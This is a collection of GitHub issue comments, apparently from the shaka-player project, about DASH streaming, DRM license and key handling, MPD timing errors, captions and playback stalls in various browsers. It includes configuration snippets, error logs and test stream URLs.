keys to default_KID and to periods, respectively. There appears to be no IOP-compatible scenario wherein scenario 1 ensures that the CDM has key Y available for use.\nDo you see flaws in this logic?. With a hierarchical key scenario, you have two types of keys:\n\nthe sample encryption keys; these are embedded into PSSH boxes in each media sample in a protected form; these keys are sometimes called leaf keys\nto unlock their protected form, another key is needed; this is sometimes called the root key\n\nWhat exactly this \"protection\" is depends on the DRM system. In the simplest case, the sample keys are just encrypted with the root key.\nIn a hierachical scenario, the player deals only with root keys - the leaf keys are loaded from PSSH by the CDM and the player does not need to deal with them. Root keys look just like regular keys to the player. They are delivered in regular (to the player) licenses.\nSometimes licenses carrying root keys are called root licenses. Sometimes the data structures within the PSSHs that carry leaf keys are called leaf licenses.\nDoes this explain some?. > There might be one sample before the period start point in the content (due to timestamp rounding), which according to DASH and CMAF should be ignored. My hypothesis is that Chrome is breaking when encountering this sample.\nNo difference in behavior if I modify content so the first sample is after period start (the error remains, just references a different sample).. Thank you for fast action in confirming the state of the matter!. I made a second version of this video with slightly different segment/period timing and got a \"Large gap detected\" this time, breaking playback at the period change. I assume this is simply some timing differences making Shaka decide differently on the largeness/smallness of the gap in different conditions.\nYou can increment the 1 in the test video URL to 2 to see the 2nd video.. Thank you for investigating!\nI confirm your finding that there is something fishy with presentationTimeOffset happening in this content. After adjusting the timing on the production side to reflect reality - there should be a small offset here but not the huge value actually present in the content - this issue no longer occurs. There are still some oddities but I will file separate issues for the issues I see with the fixed (presumably) content.. Thank you for investigating!\nI confirm your finding that there is something fishy with presentationTimeOffset happening in this content. After adjusting the timing on the production side to reflect reality - there should be a small offset here but not the huge value actually present in the content - this issue no longer occurs. There are still some oddities but I will file separate issues for the issues I see with the fixed (presumably) content.. Thank you for investigating!\nI confirm your finding that there is something fishy with presentationTimeOffset happening in this content. After adjusting the timing on the production side to reflect reality - there should be a small offset here but not the huge value actually present in the content - this issue no longer occurs. There are still some oddities but I will file separate issues for the issues I see with the fixed (presumably) content.. Well, okay then. I was just looking at a checkbox saying \"autoplay\" not being checked and the video starting playback automatically, which seemed wrong to me as a plain user of the demo app. But if it is by design then it is by design, I guess.. Illustration attached (Windows 10, all browsers as far as I can tell): \n\n. Yes, that sounds like it would indeed be an improvement.. FYI an anomaly was discovered in these assets https://github.com/Dash-Industry-Forum/dash.js/issues/2334 - the KID in the PSSH is 32 bytes long (it is a hex string, not binary).\nAs it is in the PSSH, perhaps this is normal in some context? I know of no reference that says what the KID field in the Widevine PSSH is actually supposed to contain. All other implementations I have seen so far have a binary 16-byte KID.. Is this about #EXT-X-PLAYREADYHEADER: or some newer HLS+PR binding?. I confirm your assessment of the facts. Apologies for insufficient investigation on my side!. > I don't think changing the duration of a Period is allowed. \nWell, DASH itself says very little about what is allowed in this case (\"If MPD@type is set to 'dynamic', the MPD may be updated during the Media Presentation.\" is the core of it, which I would agree is so vague as to be useless).\nIOP says in 4.3.2.2.4 the following which I think applies here:\n\nNote: An MPD update may extend the Period end time of the last regular Period. For details refer to section 4.4.\n\nB.1.6 also describes a use case of known duration that is extended (though I would agree to it being too vague to base any decisions on).\n\nThis should probably be treated as a live stream and not an in-progress recording.\n\nJust for my education, can you describe the difference between these cases, from a player viewpoint? I am curious what behavior is different between these cases in terms of user-visible behavior.. http://dashif.org/conformance has some sort of dynamic manifest validator builtin - you might try that on your stream if you have not already. It shows up as a link if you feed it a dynamic manifest. I am not sure of its scope of features, however. Still, maybe it gives you some hints that enable further diagnostics. It seems to have trouble with your manifest when feeding a URL, though. When feeding the file as an upload, it reports some MPD validation errors.\n@joeyparrish do you think there is anything in particular that could be done by whoever to make it easier to troubleshoot issues with live streams? I only recently started dealing with live and am fast running into difficulties in understanding behavior. As you say, it is pretty difficult. I wonder if you already have some thoughts on what could be the most \"cost-effective\" investments of effort for helping diagnose such issues? Could the DASH-IF conformance validator be amended to do more validation in some regard? Or would runtime diagnostics from players be more useful? What mechanisms do you use to understand such occurrences?. As a member of the wider community, I am happy to help paint a picture of desires by stating my disinterest in fps.1_0 and great interest in fps.2_0 in all its ways and forms.\nAre there contributions besides writing code that might benefit activity on this topic?. That tends to happen when the key used to encrypt the video is not the same as the key returned by the license server.. I confirm the issues does not appear to reproduce with the master branch!\nThe master branch also tries to download segments from the year 2066, though. I will see if I can get some URLs available to you and post a new issue about that (anything change in segment number calculations recently?).. Here's an externally accessible URL from a development server: https://live.axtest.net/routes/lapd-v1-cb/www_c1/Manifest.mpd\n~I expect it will stay up for around 6-7 hours from this comment. After that it might stop publishing the period with presentationTimeOffset due to a known issue.~ Stream should be relatively stable now.. This is breaking a lot of streams. Can we get a fix in the near future @joeyparrish? We're currently not able to upgrade to latest version due to this blocking us.. I confirm the stream I posted appears to work with the nightly build.. I am quite sure the answer is \"yes, it must be in wall clock time and any dash.js behavior to the contrary is an accident\" but I will leave it to player authors to go in depth about that. I just wanted to mention that clock-sync is solved by the UTCTiming element in DASH (defined in 2014 amd 1), which provides an authoritative time source to the client and thus defines \"wall clock time\" unambiguously.\nEdit: this is if you want to be IOP-conforming. Non-IOP-conforming behavior can be far more flexible, of course.. Thanks for taking a look! Glad to hear there was nothing surprising in there.\nDo I understand it right from your comment about leap-second-aware clock that whatever browser based timing mechanism is used by Shaka is not leap second aware? That is to say, when Shaka currently adds a period@start to MPD@availabilityStartTime, is the former added as a duration of Unix ticks, thereby ending up with a result N seconds in the future compared to real time (where N is the elapsed count of leap seconds)?. It does indeed look like Date.parse ignores leap seconds, which will likely lead to an availability timeline de-sync for content that uses real-time-accurate timing.\nI will close this now as comments were received and questions answered. Thanks!. I see presentationTimeOffset in the example manifest, so I bet this is the same as https://github.com/google/shaka-player/issues/1232 where PTO is incorrectly added to determine segment position. Behavior matches what I saw with my content (segment position far in the future).. Duplicate of https://github.com/google/shaka-player/issues/1232 I believe. What would be your expectations to HLS content that has a server-side ad inserted that has a different set of tracks than the main content. For example, main content has 3 audio languages and 5 video quality levels, whereas ad might have just one video and one audio track. How would such content need to be structured for Shaka to consume it without issues? How should the change in tracks be signaled at discontinuity time?. FYI @arjen4157 DASH-IF is currently discussing removal of this practice from the list of implementation guidelines. See https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues/160\nIn general, the fact that segments are outside the time shift buffer should be enough to prevent them from being accessed - there is no need to modify segment addressing parameters just to make expired segments not be used.. UTCTiming is specified in ISO/IEC 23009-1:2014/Amd 1:2015.. > what is the use case for such a drastic change in the presentation?\nThis is a live stream scenario where the content has different parameters in different time periods.\nFor example, changing the set of audio/text languages available (consider a TV channel showing different movies - not every language might be available for each one). The languages available for ads might also differ from the langauges available for the main content.\nLikewise, changing the set of quality levels offered - not all content might be available in all quality levels, or the bitrates might just be optimized differently per movie (e.g. 500/1000/3000 for one, 800/1500/4500 for another).. Thank you for the answer! I will attempt to find some content to reproduce the behavior I mentioned. I wonder if I perhaps misjudged the behavior if you expect it to cut accurately.\n\nSo it is important to have the first segment start after the Period start\n\nI assume I can read this as \"on or after\"?. I have not had time to dig into this, I fear. Let's close it for now - I will reopen if I have a specific repro now that I know this is actually meant to work.. Can you provide the FFmpeg and Shaka Packager commands you use to generate this problematic stream? Does it also reproduce with FFmpeg test input sources? There is ongoing work to upgrade the live timing validation in the DASH-IF DASH conformance validator and having more test scenarios included would be helpful in ensuring the upgrades can point out all the issues.. Please excuse slight rounding in my below calculations.\nLoading the above link at  03.04.2018 09:20:52 UTC gives me MPD@availabilityStartTime of 29.03.2018 10:17:29 UTC, which means that 428 603 seconds have elapsed since the start of the period.\nGiven MPD@timeShiftBufferDepth of 15000S, the availability window is approximately from 413 603 to 428 603 seconds.\nShaka tries to load 428 483 on startup. This is within the availability window.\nI do see the \"cannot find segment\" error. Why is this? Let's explore, taking audio track as example.\nGiven timescale of 90 000, the audio track <SegmentTimeline> defines 4689 segments starting at t/timescale=412 508 seconds and lasting for a total of d*(r+1)/timescale=15 004 seconds. This seems to match the time shift buffer depth more or less. The MPD segment timeline ends at 412 508+15 004=427 512 seconds.\nYou can see the problem, I hope.\n\nThe MPD first says that the available segments range from 413 603 to 428 603 seconds.\nThen it actually gives you segments for 412 508 to 427 512 seconds.\n\nLet me be quite clear: this is an error in the MPD. This content is malformed. Possibly due to encoder drift, possibly due to something else.\nWhile it is laudable that Shaka player developers plan to work around such content defects in a future version, you should not have an expectation that malformed content will play. Yes, there are players that play malformed content due to quirks in their implementation - not every error in the content \"matters\" because some values get ignored by some players, depending on their algorithm.\nAt the end of the day, however, if you wish to achieve a good playback experience across the DASH ecosystem, I suggest you fix your content so that the MPD does not contain conflicting information about segment availability. I am not familiar enough with FFmpeg and Shaka Packager to advise what the appropriate corrective action might be, unfortunately.. ",
    "dsilhavy": "Hi Joey,\nthanks for your feedback. We have not used the configure method, instead we have hardcoded the persistent state right before the requestMediaKeySystemAccess call is made (drm_engine.js line 498):\nconfig.persistentState = 'required';\nreturn navigator.requestMediaKeySystemAccess(keySystem, [config]);\nI will try to do in the way you described but I guess it will not change the behavior.\nThanks and best regards\nDaniel\n. ",
    "mendelk": "Thanks @joeyparrish. I understand that Chrome Apps and Extensions are niche use cases, so any work you put into supporting these is greatly appreciated!\n. ",
    "voltan": "Yes , I am sorry for may late answer , I have other problem by wowza ssyetm ( here : https://www.wowza.com/forums/showthread.php?51481-Player-not-work-on-SSL-pages )\nBut this check page http://www.cafeyab.com/wowza.html , shaka player work and play stream video , but navigation not work true\n. \nplease see red box , its player controller, it loaded under firefox html5 video player area and not work ( please refresh that page for test ) , but on your example player load complete\n\njust , do you have any information about my problem by SSL , its from wowza or player? https://www.wowza.com/forums/showthread.php?51481-Player-not-work-on-SSL-pages\n. thank you very much for this informations , let me time today to work on it\n. thank you very much , its seems we need setup SSL on wowza first, I try do it and tell you result \nthank you for your help\n. Hello\nI solve my problem by SSL and setup demo website for better test , please check this link : http://media.cafeyab.com/video/essse-caffe-12\nIf you check the page, player loaded and play video true, but player skin is default browser skin , player controller loaded under player and not work , hope I can explain my problem true, I think I had mistake on setup player , but could not find that\n\n. Thank you for your informations and replay, I try active control by this method and ask my team to  decision about it , But I think will we use browser controls\nThank you very much\n. ",
    "roberb04": "Hi Joey,\nThanks for getting back to me. Unfortunately the transmux option won't work for me because I have to demonstrate subs within Classic/WVM/SMIL package.\nThe original Shaka Player did support Classic/WVM of course - do you know if it also supported the SMIL manifest? If it did, is there a v1 tag you'd recommend me to download and build for this project?\nThanks again,\nBruce.\n. In that case I am mistaken - sincere apologies! I'm now trying to perform my tests using the demo Widevine (Classic) browser client with the Widevine plugin in Firefox. I've got that working with my WVM packages but haven't yet tested with the SMIL manifest and subtitles. Fingers crossed.\nThanks for putting me straight about Shaka Player!\n. ",
    "customlogic": "Hi guys,\nThanks for the quick and detailed responses. My use case is probably a bit outside of what the player was designed for. Rather than using 'tracks' to store different quality levels of the same content, I'd like to store different content in each track that the user can change between during playback. For instance, different angles of a sporting event (sideline view, helmet cam, coach cam) or band members performing a song (singer, bass player, drummer). \nFor these use cases, its important that audio and video stay perfectly in sync. Also, you don't want to download video you're not watching. So streaming video feels like the right tech to use. \nBut in order for it to work seamlessly, it'd be ideal for the new track to play as soon as it has buffered enough data, regardless of how much data of the old track has buffered. So the change should happen as fast as possible, but never cause a pause for buffering (The YouTube player does this when you manually change quality levels). \nAlso, the app needs to know when the swap has happened, so it can update UI elements, etc. An event would be useful for this. Or I suppose the app could poll the Player every frame to see which track is currently being displayed?\n. Thanks for that explanation. It sounds like I'll need to find another way to swap between different content.\nIn regards to a seamless swap between tracks, is there something inherent in MediaSource that prevents the downloading of segments that are already buffered?  I'm just imagining a scenario where you have seconds 0-20 buffered for track A. At 10s, the user asks for track B. We stop downloading track A and start downloading track B from second 10, while track A continues to play. When track B has buffered enough to play through smoothly, we then swap to displaying track B at whatever time it is now. Depending on bitrate and download size, this might happen while track A is at second 11, 14, 17 etc. \nI can understand if this isn't something you feel is appropriate for the Shaka player, but I'm just curious if its even possible. \n. Thank you for the very detailed explanation and helpful advice.  The difference in abort() implementation sound like a real pain (the joy of web development, eh?), but it sounds like you guys have found a good way to handle it. \nThanks again!\n. ",
    "LuckyHamster": "Hi, stream example - http://185.5.40.103/DASH_encrypted/SER_03271/video.mpd\nlicense https://udrm.moyo.tv/drm/widevine/license\n. ",
    "rcollins112": "Hmm, ok.  So based on \"compatible with a single decoder\", does that mean AVC, HEVC, VP8, and VP9 content should all be in separate video AdaptionSets.  And AAC, HE-AAC, AC-3, E-AC-3, Vorbis and Opus content should all be in separate audio AdaptionSets?  But variations of any one of those codecs can be listed in the same AdaptionSet? (eg AVC baseline/main/high or HE-AAC v1/v2)\nThanks in advance!\n. Great thanks for the quick feedback!  I'll go ahead and close the issue.\n. ",
    "ewosleger": "Everything appears to be working correctly. Thanks for the quick collaboration.\n. Regarding our captions in reverse order. A snippet of a specific ttml segment.\n<p begin=\"00:00:55.000\" end=\"00:00:56.541\" region=\"pop1\" style=\"basic\" tts:extent=\"45% 5.33%\" tts:origin=\"27.5% 79.33%\">\n            JEANNIE:\n            <span tts:fontStyle=\"italic\">You still</span>\n         </p>\n         <p begin=\"00:00:55.000\" end=\"00:00:56.541\" region=\"pop2\" style=\"basic\" tts:extent=\"67.5% 5.33%\" tts:origin=\"15% 84.66%\">\n            <span tts:fontStyle=\"italic\">stubbornly insist on being</span>\n         </p>\nThe first <p> \"pop1\" tss:origin y cord is 79.33% from the top. \nThe secons <p> \"pop2\" tss:origin y cord should be below \"pop1\" y at 84.66% however it is rendering above the first <p>.\n\n. Yes, one issue lead to another. We are experiencing the reverse stacking of the captions. Looking for a quick solution we have an addition ttml files that is not bundled with the manifest the we wanted to load in addition to the embedded ttml files. \nIn the player.load i added the snippet:\n`player.load(_globalSelf.manifest).then(function() {\nparent.messageService.dispatch(ShoMediaNotifications.PLAYER_READY, null);\nif(typeof parent.params.dash_ttml !== 'undefined){\nthis.player.addTextTrack(parent.params.dash_ttml, 'eng','caption', 'text/ttml');\n}\n}).catch(_globalSelf.onError);`\nAssuming that is the correct addTextTrack syntax, I was thrown the following error:\n'player errors out: tb[b] is not a constructor'. We do not have the attribute \"tts:writingMode\" in our ttml.. I believe out latest build version is Shake v 2.0.8 - I will update and test latest stable build.. ",
    "L-P": "Hi,\nI'd like an update on this. While persistent licenses are still missing from\nChrome (and the feature request got archived after a year without any answer)\nI'm wondering why the encrypted content itself cannot be stored.\nA working Internet connection would still be required to get the license but\nthe content would already be there.\nWould it be possible to store only the content when persistent licenses are not\navailable?. ",
    "YingChen-dci": "Hi @joeyparrish \nThanks for the comment!!\nI will set the configuration of Shaka Player, and try it again.\nI closed the issue, and I will reopen it if i get further question.\nThanks again.\n. Hello,\nI set the configuration of Shaka Player, it is able to access to Widevine license server. However rejected by license server. Error is below:\n// console.log \nShaka Error DRM.LICENSE_RESPONSE_REJECTED (Rejected with system code (13))\nDid it mean I didn't pass the authentication? Or other reason?\n. Here is JSON code.\n//JSON\nError code 6008 object \ns\u2026a.u\u2026l.Error {category: 6, code: 6008, data: Array[1], message: \"Shaka Error DRM.LICENSE_RESPONSE_REJECTED (Rejected with system code (13))\", stack: \"Error: Shaka Error DRM.LICENSE_RESPONSE_REJECTED (\u20260.55/shaka-player/lib/media/drm_engine.js:946:23)\"}\n. Sorry, is this one?\n------- EME Method Call and Event Log\nUpdateCall 10:20:9:459\ntarget:  \n    MediaKeySession {\n        sessionId:  A5AD56B43320FCC47841316E569C90F1\n        expiration:  null\n        keyStatuses:  Array{}\n    }\nreturned:  Promise{}\nresponse:  \n    60,33,68,79,67,84,89,80,69,32,72,84,77,76,32,80,85,66,76,73\n    67,32,34,45,47,47,87,51,67,47,47,68,84,68,32,72,84,77,76,32\n    51,46,50,32,70,105,110,97,108,47,47,69,78,34,62,10,60,104,116,109\n    108,62,10,32,60,104,101,97,100,62,10,32,32,60,116,105,116,108,101,62\n    73,110,100,101,120,32,111,102,32,47,112,114,111,120,121,60,47,116,105,116\n    108,101,62,10,32,60,115,99,114,105,112,116,32,116,121,112,101,61,34,116\n    101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,32,115,114,99,61\n    34,104,116,116,112,58,47,47,103,99,46,107,105,115,46,115,99,114,46,107\n    97,115,112,101,114,115,107,121,45,108,97,98,115,46,99,111,109,47,66,68\n    55,49,66,54,52,52,45,57,49,66,55,45,52,57,52,52,45,65,53,55\n    49,45,48,49,67,51,68,53,55,48,53,52,51,48,47,109,97,105,110,46\n    106,115,34,32,99,104,97,114,115,101,116,61,34,85,84,70,45,56,34,62\n    60,47,115,99,114,105,112,116,62,60,47,104,101,97,100,62,10,32,60,98\n    111,100,121,62,10,60,104,49,62,73,110,100,101,120,32,111,102,32,47,112\n    114,111,120,121,60,47,104,49,62,10,32,32,60,116,97,98,108,101,62,10\n    32,32,32,60,116,114,62,60,116,104,32,118,97,108,105,103,110,61,34,116\n    111,112,34,62,60,105,109,103,32,115,114,99,61,34,47,105,99,111,110,115\n    47,98,108,97,110,107,46,103,105,102,34,32,97,108,116,61,34,91,73,67\n    79,93,34,62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102\n    61,34,63,67,61,78,59,79,61,68,34,62,78,97,109,101,60,47,97,62\n    60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102,61,34,63,67\n    61,77,59,79,61,65,34,62,76,97,115,116,32,109,111,100,105,102,105,101\n    100,60,47,97,62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101\n    102,61,34,63,67,61,83,59,79,61,65,34,62,83,105,122,101,60,47,97\n    62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102,61,34,63\n    67,61,68,59,79,61,65,34,62,68,101,115,99,114,105,112,116,105,111,110\n    60,47,97,62,60,47,116,104,62,60,47,116,114,62,10,32,32,32,60,116\n    114,62,60,116,104,32,99,111,108,115,112,97,110,61,34,53,34,62,60,104\n    114,62,60,47,116,104,62,60,47,116,114,62,10,60,116,114,62,60,116,100\n    32,118,97,108,105,103,110,61,34,116,111,112,34,62,60,105,109,103,32,115\n    114,99,61,34,47,105,99,111,110,115,47,98,97,99,107,46,103,105,102,34\n    32,97,108,116,61,34,91,80,65,82,69,78,84,68,73,82,93,34,62,60\n    47,116,100,62,60,116,100,62,60,97,32,104,114,101,102,61,34,47,34,62\n    80,97,114,101,110,116,32,68,105,114,101,99,116,111,114,121,60,47,97,62\n    60,47,116,100,62,60,116,100,62,38,110,98,115,112,59,60,47,116,100,62\n    60,116,100,32,97,108,105,103,110,61,34,114,105,103,104,116,34,62,32,32\n    45,32,60,47,116,100,62,60,116,100,62,38,110,98,115,112,59,60,47,116\n    100,62,60,47,116,114,62,10,60,116,114,62,60,116,100,32,118,97,108,105\n    103,110,61,34,116,111,112,34,62,60,105,109,103,32,115,114,99,61,34,47\n    105,99,111,110,115,47,116,101,120,116,46,103,105,102,34,32,97,108,116,61\n    34,91,84,88,84,93,34,62,60,47,116,100,62,60,116,100,62,60,97,32\n    104,114,101,102,61,34,112,114,111,120,121,46,112,121,34,62,112,114,111,120\n    121,46,112,121,60,47,97,62,60,47,116,100,62,60,116,100,32,97,108,105\n    103,110,61,34,114,105,103,104,116,34,62,50,48,49,54,45,48,57,45,49\n    53,32,48,49,58,49,57,32,32,60,47,116,100,62,60,116,100,32,97,108\n    105,103,110,61,34,114,105,103,104,116,34,62,53,46,48,75,60,47,116,100\n    62,60,116,100,62,38,110,98,115,112,59,60,47,116,100,62,60,47,116,114\n    62,10,32,32,32,60,116,114,62,60,116,104,32,99,111,108,115,112,97,110\n    61,34,53,34,62,60,104,114,62,60,47,116,104,62,60,47,116,114,62,10\n    60,47,116,97,98,108,101,62,10,60,97,100,100,114,101,115,115,62,65,112\n    97,99,104,101,47,50,46,52,46,55,32,40,85,98,117,110,116,117,41,32\n    83,101,114,118,101,114,32,97,116,32,53,50,46,49,57,56,46,49,48,46\n    53,53,32,80,111,114,116,32,56,48,60,47,97,100,100,114,101,115,115,62\n    10,60,47,98,111,100,121,62,60,47,104,116,109,108,62,10\nformattedMessage:  null\nUpdateCall Promise Result 10:20:9:463\nstatus:  rejected\nresult:  DOMException{}\n. I see. \nThank you very much for your information.. ",
    "yairans": "@ismena \nI still can reproduce it on IE11+win8.1 with another device as well.\nTo be more specific, the hiccups take place between second # 17-23 \n. @ismena At the problematic seconds (17+) I get the following:\n{\"width\":1280,\"height\":720,\"streamBandwidth\":5128249,\"decodedFrames\":431,\"droppedFrames\":0,\"estimatedBandwidth\":58081948.18285577,\"playTime\":18.536999940872192,\"bufferingTime\":0.33099985122680664,\"switchHistory\":[{\"timestamp\":1475999683.355,\"id\":3,\"type\":\"audio\",\"fromAdaptation\":true},{\"timestamp\":1475999683.355,\"id\":1,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1475999690.352,\"id\":2,\"type\":\"video\",\"fromAdaptation\":true}]}\nIs interesting that if I tap the \"Load\" button then the playback is smooth (unless I reload the demo page itself). I ran the \"getStats\" command after \"Load\" tapping and I got the following:\n{\"width\":1280,\"height\":720,\"streamBandwidth\":5128249,\"decodedFrames\":450,\"droppedFrames\":0,\"estimatedBandwidth\":49408541.905482955,\"playTime\":18.773000240325927,\"bufferingTime\":0.750999927520752,\"switchHistory\":[{\"timestamp\":1476000714.476,\"id\":3,\"type\":\"audio\",\"fromAdaptation\":true},{\"timestamp\":1476000714.476,\"id\":2,\"type\":\"video\",\"fromAdaptation\":true}]}\n. With the nightly I see the same problem earlier from about the 9th second.\nFor this time I get the following:\n{\"width\":1280,\"height\":720,\"streamBandwidth\":5128249,\"decodedFrames\":209,\"droppedFrames\":0,\"estimatedBandwidth\":59546437.453934394,\"playTime\":8.774999856948852,\"bufferingTime\":0,\"switchHistory\":[{\"timestamp\":1476358179.797,\"id\":3,\"type\":\"audio\",\"fromAdaptation\":true},{\"timestamp\":1476358179.797,\"id\":1,\"type\":\"video\",\"fromAdaptation\":true},{\"timestamp\":1476358180.005,\"id\":2,\"type\":\"video\",\"fromAdaptation\":true}]}\n. @cpeterso,  I can reproduce this one on both mac (FF 48) and windows 10 (FF 47).\nWhen I switch the audio track I see a red line \"Shaka Error MEDIA.VIDEO.ERROR(3,)\"\nand the loading spinner. \nIn the console I get the following:\n(audio:4) failed fetch and append: code=3014         streaming_engine.js:1167:7\nPlayer error Object { category: 3, code: 3014, data: Array[1], message: \"Shaka Error MEDIA.MEDIA_SOURCE_OPER\u2026\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }   main.js:190:3\nMedia resource mediasource:http://shaka-player-demo.appspot.com/d6cc740e-54f3-8c4c-aa9c-ad439474c2b5 could not be decoded.                demo\nPlayer error Object { category: 3, code: 3016, data: Array[2], message: \"Shaka Error MEDIA.VIDEO_ERROR (3,)\", stack: \"shaka.util.Error@http://shaka-playe\u2026\" }         main.js:190:3\nfailed to get buffered range for video DOMException [InvalidStateError: \"An attempt was made to use an object that is not, or is no longer, usable\"\ncode: 11\nnsresult: 0x8053000b\nlocation: http://shaka-player-demo.appspot.com/lib/media/media_source_engine.js:316]\nThanks,\nYair\n. @joeyparrish @cpeterso \nThank you\n. @joeyparrish \nIt plays perfect now.\nThank you.\n. I agree. It's very important to know which error is fatal and which isn't.. @TheModMaker \nThanks a lot. @TheModMaker \nThanks a lot. @TheModMaker \nNo. My issue is after shaka chooses the lower stream.\nPlease try this link\nhttp://v2-0-4.shaka-player-demo.appspot.com/demo/?asset=http://cdnapi.kaltura.com/p/1804331/sp/180433100/playManifest/entryId/1_1h4m0b66/format/mpegdash/protocol/http/uiConfId/35530811/a.mpd;license=https://udrmv3.kaltura.com//cenc/playready/license?custom_data=eyJjYV9zeXN0ZW0iOiJPVlAiLCJ1c2VyX3Rva2VuIjoiZGpKOE1UZ3dORE16TVh6T0dZeGVtRHlEaDJRRHFyX3JaZW56NHZkQ3lYLXliYmFaYzM3OU1WMTVqeHl0d0dqcDhuQTlTaDNucVY2TkhkQVgxaWdEN3UwaDFvaWhpZU9PTW8wZzZCYjBPUlBUSGhqZ1NKRkdLLXU2UHc9PSIsImFjY291bnRfaWQiOiIxODA0MzMxIiwiY29udGVudF9pZCI6IjFfMWg0bTBiNjYiLCJmaWxlcyI6IjFfamJiOGpsOWwsMV8wOG0zOWhreSwxX21yamdpMmxyLDFfYm55eWh1anIifQ%3D%3D&signature=WnAiZlULY1wA9jxQTGFksUbDu6c%3D&;v\nThanks,\nYair  . @TheModMaker \nplease try this link on Edge\nhttp://v2-0-4.shaka-player-demo.appspot.com/demo/?asset=http://klive-a.akamaihd.net/dc-1/live/edash/p/1956791/e/0_8obdkkp6/sd/10000/t/ucOgGly-AkgGpCElsA0HKw/manifest.mpd;license=https://udrmv3.kaltura.com//cenc/playready/license?custom_data=eyJjYV9zeXN0ZW0iOiJPVlAiLCJ1c2VyX3Rva2VuIjoiWlRGaE1EVmtNRGxoTVRGak0yTXhaR0ZpT1dWaU9UUmpZbVF5WldVeVlqWXdZekE1WldZNFpId3hPVFUyTnpreE96RTVOVFkzT1RFN01qUTRPRGs0TlRVNE1qc3dPekUwT0RnNU9EVTFPRE11TnpZNU16dGhaRzFwYmp0MmFXVjNPaW9zZDJsa1oyVjBPakU3T3c9PSIsImFjY291bnRfaWQiOiIxOTU2NzkxIiwiY29udGVudF9pZCI6IjBfOG9iZGtrcDYiLCJmaWxlcyI6IjBfbTJrdXFkdzMsMF9sOGxlMHJpbiwwX2ljeXE5b216LDBfbnQ4N29hOW0sMF9jazZvdGtoayJ9&signature=7YnlmEmz7IRKFyHMzAykNDdzi%2FE%3D;v\nCharles just simulates a low bandwidth (750kbps in my case).\nIn case of low bandwidth shaka should select and switch to the appropriate video track. Indeed, shaka does it (after a min but it's ok as you comment above).\nBut after shaka selects the lower video track the playback get stuck in each ~10 sec for ~2 sec.\nI hope it's clear now.\nYair\n. @TheModMaker \nI increased the bufferingGoal in the player configuration to 30 (the default is 10).\nNothing has changed. I still experience the same wrong behavior. \nThanks,\nYair. BTW, I'm not sure is relevant here, but when I switch any track (video, audio and text) I get the 'adaptation' event, unlike the documentation 'AdaptationEvent\nFired when an automatic adaptation causes the active tracks to change. Does not fire when the application calls selectVariantTrack() selectTextTrack(), selectAudioLanguage() or selectTextLanguage().'\nAdditionally, when I enable/disable the adaption I also get the 'adaptation' event.\nAll of these can reproduce easily in shaka demo page with the Angel One stream.. @joeyparrish \nI'm using the latest demo app version 2.1.7-debug.\nI can reproduce it also with the latest of master.\nThanks.. @joeyparrish Please reopen. \nStill reproduced on Edge/IE11. . @joeyparrish \nConfirmed. it's working ok in the nightly link above (excluding the controls bug).\nThanks.. @joeyparrish \nplease reopen this issue. \nReproduced on ie11+win8 with v2.3.2.\nRegression from v2.2.8. @joeyparrish \nActually it reproduced with v2.2.8 as well\nconsole.log\n. ",
    "Zorig": "@joeyparrish  I am using shaka 2.02 and set robustness level to SW_SECURE_CRYPTO for audio and video still get warning. Is it because of version? I have been used shaka(2.0.0 beta) before.\nthis.get('player').configure({\n    drm: {\n        servers: {'com.widevine.alpha': data.token},\n        advanced: {\n        'com.widevine.alpha': {\n            'videoRobustness': 'SW_SECURE_CRYPTO',\n            'audioRobustness': 'SW_SECURE_CRYPTO'\n        }\n        }\n    }\n})\n. @joeyparrish I am using custom app(Ember 2.10) also i used probeSupport like this. Is it wrong usage?\nshaka.polyfill.installAll();\nif (shaka.Player.isBrowserSupported()) {\n    shaka.Player.probeSupport().then((support) => {\n        if (support.drm['com.widevine.alpha']) {\n            // this.set('video', document.getElementById('video'));\n            // this.set('player', new shaka.Player(this.video));\n            this.get('player').configure({\n                abr: {\n                    enabled: false\n                },\n                streaming: {\n                    retryParameters: {\n                        timeout: 0, // timeout in ms, after which we abort a request; 0 means never\n                        maxAttempts: 5, // the maximum number of requests before we fail\n                        baseDelay: 1500, // the base delay in ms between retries\n                        backoffFactor: 2, // the multiplicative backoff factor between retries\n                        fuzzFactor: 0.5, // the fuzz factor to apply to each retry delay\n                    }\n                },\n                drm: {\n                    advanced: {\n                        'com.widevine.alpha': {\n                            'videoRobustness': 'SW_SECURE_CRYPTO',\n                            'audioRobustness': 'SW_SECURE_CRYPTO'\n                        }\n                    }\n                }\n            });\n        } else {\n            this.set('error', 'ERROR');\n        }\n    });\n});. Hi @joeyparrish,\nOk i got it. So here is the answers.\n\nI just tested it with latest version (v2.0.3), still some of my songs are not playing\nEven with latest code from master branch shows this bug.\nI am using it on custom app. Ember(2.10)\nI was using shaka(v2.0.0-beta2) it was working perfectly fine.\n\n\nTesting browser is chrome(55), firefox(50) on linux(ubuntu 16.04), mac osx sierra\nI load songs from my server through widevine expressPlay (DRM)\nWith album, or song play in shaka player.\n\nPlus i got robustness level warning in console. Hence i thought it's because of i did not set robustness level. Then i set robustness level on it still warning exists\n. i think this is what happened to me #657, little problem is my content's link is only one time(it generates random token url for content in widevine service) so even if i sent you manifest it wont work. If it's okay i'll send you web-app login credentials and URL to your email. This is the only way you can check issue in real-time. Yeah forgot to mention \"tears of steel\" works. Anyway when I test it on os x it(angel one) works on Firefox 52.0.2. ",
